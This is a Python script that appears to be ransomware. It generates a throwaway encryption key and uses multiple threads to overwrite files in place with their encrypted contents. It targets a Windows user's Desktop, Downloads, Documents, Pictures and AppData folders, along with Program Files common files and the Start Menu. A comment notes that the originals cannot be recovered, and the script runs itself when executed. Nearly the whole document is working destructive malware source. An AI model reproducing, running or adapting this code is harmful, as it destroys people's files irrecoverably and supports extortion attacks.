import os
import subprocess  # use to run steghide
from cryptography.fernet import Fernet
from concurrent.futures import ThreadPoolExecutor  # Import for multithreading

def encrypt_file(filename, key):
    f = Fernet(key)
    with open(filename, "rb") as unencrypted_file:
        plaintext = unencrypted_file.read()
    ciphertext = f.encrypt(plaintext)
    # Overwrites the same file; original file can't be recovered
    with open(filename, "wb") as encrypted_file:
        encrypted_file.write(ciphertext)

def process_directory(directory, key, blacklist):
    """
    This function processes each directory, encrypting files that are not in the blacklist.
    """
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file not in blacklist:
                name, extension = os.path.splitext(file)
                # Example filter for specific file extensions
                if extension in [".exe", ".txt"]:  # Replace with actual extensions
                    file_path = os.path.join(root, file)
                    encrypt_file(file_path, key)
                print(file)

def main():
    # TODO: Key should be fetched from an image!
    key = Fernet.generate_key()

    # Represents files to avoid for safety
    blacklist = ["encrypt.exe", "scan_and_execute.py", "sys32.exe"]

    # Directories to search for user applications
    host_username = os.getlogin()
    directories_to_find_user_apps = [
        os.path.expanduser("~/Desktop"),
        f"C://Users/{host_username}/AppData/Local",
        f"C://Users/{host_username}/AppData/Roaming"
    ]

    # Directories to encrypt in their entirety
    directories_to_encrypt = [
        os.path.expanduser("~/Downloads"),
        os.path.expanduser("~/Documents"),
        os.path.expanduser("~/Pictures"),
        "C://Program Files/Common Files",
        "C://Program Files (x86)/Common Files",
        f"C://%programdata%/Microsoft/Windows/Start Menu/Programs"
    ]

    # Combine directories to pass to threads
    all_directories = directories_to_find_user_apps + directories_to_encrypt

    # Start a thread for each directory
    with ThreadPoolExecutor() as executor:  # Initialize ThreadPoolExecutor for multithreading
        # Submit each directory to be processed in a separate thread
        futures = [executor.submit(process_directory, directory, key, blacklist) for directory in all_directories]
        # Ensure each thread completes by calling `.result()` on each future
        for future in futures:
            future.result()

    print("Encryption successful!")

main()
